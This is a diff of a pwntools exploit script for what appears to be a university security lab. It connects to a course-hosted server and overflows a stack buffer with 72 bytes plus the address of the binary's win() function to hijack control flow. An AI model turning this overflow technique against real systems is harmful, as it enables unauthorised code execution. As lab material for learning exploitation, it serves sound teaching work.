@@ -1,9 +1,8 @@
 from pwn import *
 
 if __name__ == "__main__":
-
     # Declaring some variables that will be used later.
-    local_binary_file = "./lab2-1.bin"
+    local_binary_file = "./dsu-provided-files/lab2-1.bin"
     remote_server = "csc748.hostbin.org"
     remote_port = 7021
 
@@ -24,14 +23,14 @@ if __name__ == "__main__":
     win_function_address = victim_binary.symbols["win"]
 
     #### EXPLOITATION ####
-    
+
     # I can now run the process. The following lines are various forms for different purposes.
     process_to_exploit = remote(remote_server, remote_port)
     # process_to_exploit = process(local_binary_file)
     # process_to_exploit = gdb.debug(local_binary_file)
 
     # To overflow the buffer, I prepare to send 64+8 bytes.
-    buffer_overflower = b"0"*72
+    buffer_overflower = b"0" * 72
 
     # I also prepare to put the address of the win() function on the stack.
     instruction_redirect = p64(win_function_address)
